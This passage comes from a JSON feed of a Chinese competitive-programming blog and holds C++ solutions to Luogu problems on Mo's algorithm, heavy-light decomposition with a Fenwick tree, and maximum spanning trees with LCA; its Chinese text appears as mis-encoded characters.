std;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXN 100005 </span></span><br><span class=\"line\"><span class=\"type\">int</span> n,m;</span><br><span class=\"line\"><span class=\"type\">int</span> a[MAXN],val[MAXN*<span class=\"number\">2</span>],cnt[MAXN],ans[MAXN];</span><br><span class=\"line\"><span class=\"type\">int</span> tot,blosiz,powsiz;</span><br><span class=\"line\"><span class=\"type\">int</span> bel[MAXN],pow1[MAXN],pow2[MAXN];</span><br><span class=\"line\"><span class=\"type\">bool</span> calced[MAXN];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">long</span> <span class=\"type\">long</span> sum[MAXN];</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">query</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> id,l,r,p;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"type\">const</span> query &amp;sb) <span class=\"type\">const</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> bel[l]!=bel[sb.l] ? bel[l]&lt;bel[sb.l] : (bel[l]&amp;<span class=\"number\">1</span> ? r&lt;sb.r : r&gt;sb.r);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125; q[MAXN];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"type\">int</span> x)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsum[cnt[x]]-=x;</span><br><span class=\"line\">\tcnt[x]++;</span><br><span class=\"line\">\tsum[cnt[x]]+=x;</span><br><span class=\"line\">\t++tot;</span><br><span class=\"line\">\tval[tot]=cnt[x];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">del</span><span class=\"params\">(<span class=\"type\">int</span> x)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsum[cnt[x]]-=x;</span><br><span class=\"line\">\tcnt[x]--;</span><br><span class=\"line\">\tsum[cnt[x]]+=x;</span><br><span class=\"line\">\t++tot;</span><br><span class=\"line\">\tval[tot]=cnt[x];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">power</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> p)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1LL</span>*pow1[x%powsiz]*pow2[x/powsiz]%p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class=\"line\">\tblosiz=<span class=\"built_in\">sqrt</span>(n);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++) </span><br><span class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;a[i]),bel[i]=(i<span class=\"number\">-1</span>)/blosiz;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=m;i++) </span><br><span class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d%d&quot;</span>,&amp;q[i].l,&amp;q[i].r,&amp;q[i].p),q[i].id=i;</span><br><span class=\"line\">\t<span class=\"built_in\">sort</span>(q+<span class=\"number\">1</span>,q+m+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> l=<span class=\"number\">1</span>,r=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=m;i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (l&gt;q[i].l) <span class=\"built_in\">add</span>(a[--l]);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (r&lt;q[i].r) <span class=\"built_in\">add</span>(a[++r]);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (l&lt;q[i].l) <span class=\"built_in\">del</span>(a[l++]);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (r&gt;q[i].r) <span class=\"built_in\">del</span>(a[r--]);</span><br><span class=\"line\">        </span><br><span class=\"line\">\t\t<span class=\"type\">int</span> newtot=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> len=r-l+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> j=<span class=\"number\">1</span>;j&lt;=tot;j++) </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (val[j]&amp;&amp;sum[val[j]]!=<span class=\"number\">0</span>&amp;&amp;!calced[val[j]]) </span><br><span class=\"line\">\t\t\t\tcalced[val[j]]=<span class=\"number\">1</span>,val[++newtot]=val[j];</span><br><span class=\"line\">\t\ttot=newtot;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpowsiz=<span class=\"built_in\">sqrt</span>(len)+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tpow1[<span class=\"number\">0</span>]=pow2[<span class=\"number\">0</span>]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> j=<span class=\"number\">1</span>;j&lt;=powsiz;j++) </span><br><span class=\"line\">\t\t\tpow1[j]=(pow1[j<span class=\"number\">-1</span>]+pow1[j<span class=\"number\">-1</span>])%q[i].p;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> j=<span class=\"number\">1</span>;j*powsiz&lt;=len;j++) </span><br><span class=\"line\">\t\t\tpow2[j]=<span class=\"number\">1LL</span>*pow2[j<span class=\"number\">-1</span>]*pow1[powsiz]%q[i].p;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> powLen=<span class=\"built_in\">power</span>(len,q[i].p);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> j=<span class=\"number\">1</span>;j&lt;=tot;j++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"type\">long</span> <span class=\"type\">long</span> num=sum[val[j]]%q[i].p;</span><br><span class=\"line\">\t\t\tans[q[i].id]=(ans[q[i].id]+num*(powLen-<span class=\"built_in\">power</span>(len-val[j],q[i].p)))%q[i].p;</span><br><span class=\"line\">\t\t\tcalced[val[j]]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tans[q[i].id]+=q[i].p;</span><br><span class=\"line\">\t\tans[q[i].id]%=q[i].p;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=m;i++) </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,ans[i]);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "åˆ†å—",
                "å“ˆå¸Œ"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/",
            "url": "http://cubicy.icu/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/",
            "title": "æ´›è°·:P3950 éƒ¨è½å†²çª",
            "date_published": "2018-10-28T12:00:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href=\"https://www.luogu.org/problemnew/show/P3950\">https://www.luogu.org/problemnew/show/P3950</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€æ£µæ ‘ï¼Œæ¯æ¬¡ç»™å®šä¸€ä¸ªæ“ä½œï¼Œæœ‰å¦‚ä¸‹ä¸¤ç§ï¼š  </p>\n<ol>\n<li>å°†æŸæ¡è¾¹æŸ“é»‘<br>2.è¯¢é—®ç»™å®šçš„u,vä¸¤ç‚¹é—´æ˜¯å¦æœ‰è¾¹è¢«æŸ“é»‘</li>\n</ol>\n<hr>\n<p>###æ€è·¯<br>è¯¢é—®ä¸¤ç‚¹é—´æ˜¯å¦æœ‰è¾¹è¢«æŸ“é»‘åªéœ€è¦åœ¨æ±‚LCAæ—¶åˆ¤ä¸€ä¸‹å°±è¡Œã€‚æ‰€ä»¥ç›´æ¥ä¸Šæ ‘é“¾å‰–åˆ†å³å¯ã€‚<br>æœ¬é¢˜ä¸éœ€è¦ä½¿ç”¨çº¿æ®µæ ‘ï¼Œä½¿ç”¨æ ‘çŠ¶æ•°ç»„æŸ¥è¯¢è·¯å¾„ä¸Šæ˜¯å¦æœ‰ä»»æ„ä¸€æ®µåŒºé—´å’Œä¸ä¸º0å³å¯ã€‚</p>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> lowbit(x) x&amp;-x</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> pair&lt;<span class=\"type\">int</span>, <span class=\"type\">int</span>&gt; P;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> maxn = <span class=\"number\">1000000</span>;</span><br><span class=\"line\">P war[maxn];</span><br><span class=\"line\"><span class=\"type\">int</span> fa[maxn], dep[maxn], val[maxn], sz[maxn], top[maxn], son[maxn];</span><br><span class=\"line\"><span class=\"type\">int</span> tre[maxn];</span><br><span class=\"line\"><span class=\"type\">int</span> tot;</span><br><span class=\"line\"><span class=\"type\">int</span> cntw;</span><br><span class=\"line\"><span class=\"type\">int</span> n, m;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">read</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> ch, x = <span class=\"number\">0</span>, f = <span class=\"number\">1</span>;ch = <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((ch &lt; <span class=\"string\">&#x27;0&#x27;</span> || ch &gt; <span class=\"string\">&#x27;9&#x27;</span>) &amp;&amp; ch != <span class=\"string\">&#x27;-&#x27;</span>) ch = <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    ch == <span class=\"string\">&#x27;-&#x27;</span> ? f = <span class=\"number\">-1</span>, ch = <span class=\"built_in\">getchar</span>() : <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(ch &gt;= <span class=\"string\">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class=\"string\">&#x27;9&#x27;</span>) &#123;</span><br><span class=\"line\">        x = x * <span class=\"number\">10</span> + ch - <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">        ch = <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> f * x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Edge</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> to, len, nxt;</span><br><span class=\"line\">    <span class=\"built_in\">Edge</span>() &#123;&#125;</span><br><span class=\"line\">    <span class=\"built_in\">Edge</span>(<span class=\"type\">int</span> _to, <span class=\"type\">int</span> _len, <span class=\"type\">int</span> _nxt):<span class=\"built_in\">to</span>(_to), <span class=\"built_in\">len</span>(_len), <span class=\"built_in\">nxt</span>(_nxt) &#123;&#125;</span><br><span class=\"line\">&#125;E[maxn];</span><br><span class=\"line\"><span class=\"type\">int</span> h[maxn], cnte;</span><br><span class=\"line\"><span class=\"type\">int</span> L[maxn], R[maxn];</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> add)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = x;i &lt;= maxn; i += <span class=\"built_in\">lowbit</span>(i)) tre[i] += add;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">query</span><span class=\"params\">(<span class=\"type\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> ans = <span class=\"number\">0</span>; <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = x; i; i -= <span class=\"built_in\">lowbit</span>(i)) ans += tre[i]; <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">add_edge</span><span class=\"params\">(<span class=\"type\">int</span> u, <span class=\"type\">int</span> v, <span class=\"type\">int</span> w)</span> </span>&#123;</span><br><span class=\"line\">    E[++cnte] = <span class=\"built_in\">Edge</span>(v, w, h[u]), h[u] = cnte;</span><br><span class=\"line\">    E[++cnte] = <span class=\"built_in\">Edge</span>(u, w, h[v]), h[v] = cnte;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">dfs1</span><span class=\"params\">(<span class=\"type\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    sz[x] = <span class=\"number\">1</span>; dep[x] = dep[fa[x]] + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> to = E[i].to;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(to == fa[x]) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        fa[to] = x;val[x] = E[i].len;</span><br><span class=\"line\">        <span class=\"built_in\">dfs1</span>(to);</span><br><span class=\"line\">        sz[x] += sz[to];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(sz[to] &gt; sz[son[x]]) son[x] = to;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">dfs2</span><span class=\"params\">(<span class=\"type\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">    L[x] = ++tot;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x == son[fa[x]]) top[x] = top[fa[x]];</span><br><span class=\"line\">    <span class=\"keyword\">else</span> top[x] = x;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(son[x]) <span class=\"built_in\">dfs2</span>(son[x]);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> to = E[i].to;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(to == fa[x] || to == son[x]) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"built_in\">dfs2</span>(to);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    R[x] = tot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">cut</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L[x] &lt; L[y]) <span class=\"built_in\">swap</span>(x, y);</span><br><span class=\"line\">    <span class=\"built_in\">update</span>(L[x], <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">connect</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L[x] &lt; L[y]) <span class=\"built_in\">swap</span>(x, y);</span><br><span class=\"line\">    <span class=\"built_in\">update</span>(L[x], <span class=\"number\">-1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">qsum</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span> </span>&#123;<span class=\"comment\">//å…¶å®å¯ä»¥æŸ¥åˆ°æœ‰1å°±é€€å‡ºï¼Œä¸ç”¨æŸ¥å®Œå’Œ</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ans = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(top[x] != top[y])</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(dep[top[x]] &lt; dep[top[y]])<span class=\"built_in\">swap</span>(x, y);</span><br><span class=\"line\">        ans += (<span class=\"built_in\">query</span>(L[x]) - <span class=\"built_in\">query</span>(L[top[x]] - <span class=\"number\">1</span>));</span><br><span class=\"line\">        x = fa[top[x]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dep[x] &lt; dep[y])<span class=\"built_in\">swap</span>(x, y);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x!=y)</span><br><span class=\"line\">\t\tans += (<span class=\"built_in\">query</span>(L[x]) - <span class=\"built_in\">query</span>(L[y]));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">signed</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt; n; i++) <span class=\"built_in\">add_edge</span>(<span class=\"built_in\">read</span>(), <span class=\"built_in\">read</span>(), <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">dfs1</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"built_in\">dfs2</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">1</span>;i &lt;= m; i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> s[<span class=\"number\">50</span>];</span><br><span class=\"line\">        cin &gt;&gt; s;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;C&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> u = <span class=\"built_in\">read</span>(), v = <span class=\"built_in\">read</span>();</span><br><span class=\"line\">            <span class=\"built_in\">cut</span>(u, v);</span><br><span class=\"line\">            war[++cntw] = <span class=\"built_in\">P</span>(u, v);</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(s[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;U&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> w = <span class=\"built_in\">read</span>();</span><br><span class=\"line\">            <span class=\"built_in\">connect</span>(war[w].first, war[w].second);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"built_in\">qsum</span>(<span class=\"built_in\">read</span>(), <span class=\"built_in\">read</span>()) != <span class=\"number\">0</span>) <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Yes&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "æ•°é“¾å‰–åˆ†",
                "æ ‘çŠ¶æ•°ç»„",
                "LCA"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/",
            "url": "http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/",
            "title": "æ´›è°·:P1967 è´§è½¦è¿è¾“",
            "date_published": "2018-09-28T05:48:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href>https://www.luogu.org/problemnew/show/P1902</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€ä¸ªnä¸ªç‚¹mæ¡è¾¹çš„æ— å‘å¸¦æƒå›¾ï¼Œæ¯æ¬¡è¯¢é—®2ç‚¹u,vçš„è”é€šæƒ…å†µï¼Œä¸è”é€šåˆ™è¾“å‡º-1ã€‚<br>å¦‚æœè”é€šï¼Œä¸å¦¨å°†ä¸€æ¡è”é€šu,vçš„è·¯å¾„ä¸Šçš„æœ€å°æƒå€¼è®°ä¸ºwï¼Œåˆ™è¯¥æ¬¡è¯¢é—®è¾“å‡ºæ‰€æœ‰å¯èƒ½çš„wä¸­çš„æœ€å¤§å€¼ã€‚<br>å…±æœ‰qæ¬¡è¯¢é—®ã€‚</p>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>å¯¹äºä»»æ„ä¸¤ç‚¹u&amp;vï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºèƒ½ä½¿å¾—wæœ€å¤§çš„ä¸€æ¡æœ€ä¼˜è·¯å¾„ã€‚<br>å› æ­¤éœ€è¦ç”Ÿæˆä¸€ä¸ªæ–°å›¾ï¼Œä½¿å¾—åŸå›¾ä¸­è”é€š<strong>ä»»æ„ä¸¤ç‚¹ä¹‹é—´åªå­˜åœ¨ä¸€æ¡</strong>èƒ½ä½¿å¾—wæœ€å¤§çš„æœ€ä¼˜è·¯å¾„ã€‚<br>å› æ­¤è¿™æ˜¯ä¸€æ£µæ ‘â€¦â€¦<br>åˆå› ä¸ºè¦ä½¿wæœ€å¤§ï¼Œåº”å°½é‡é€‰æ‹©è¾¹æƒå¤§çš„è¾¹ä½œä¸ºè·¯å¾„â€¦â€¦  ç„¶åå°±çªç„¶å‘è§‰ï¼šè¿™ä¸å°±æ˜¯Kruskalç®—æ³•çš„è¿‡ç¨‹å—ï¼Ÿåªä¸è¿‡æœ€å°ç”Ÿæˆæ ‘ä¼˜å…ˆé€‰æ‹©è¾¹æƒå°çš„è¾¹ï¼Œæ­¤æ—¶ä¼˜å…ˆé€‰æ‹©è¾¹æƒå¤§çš„ã€‚<br>å› æ­¤è¦æ±‚çš„æ–°å›¾å°±æ˜¯ä¸€é¢—<strong>æœ€å¤§ç”Ÿæˆæ ‘</strong>â€¦â€¦Kruskalå¯ç ´ã€‚<br>ç„¶åå°±æ˜¯æ±‚ä»»æ„ä¸¤ç‚¹LCAäº†ã€‚æ­¤å¤„ä½¿ç”¨å€å¢ï¼Œä¹Ÿæ–¹ä¾¿ç»´æŠ¤æŸèŠ‚ç‚¹å‘æ ‘æ ¹çˆ¬çš„æ—¶å€™è·¯ä¸Šçš„æœ€å°æƒå€¼ã€‚<br>ï¼ˆç”¨æ ‘é“¾å‰–åˆ†+çº¿æ®µæ ‘ç»´æŠ¤ä¹Ÿè¡Œâ€¦â€¦â€¦â€¦ï¼‰<br>æ›´å…·ä½“çš„çœ‹ä»£ç æ³¨é‡Šã€‚</p>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span 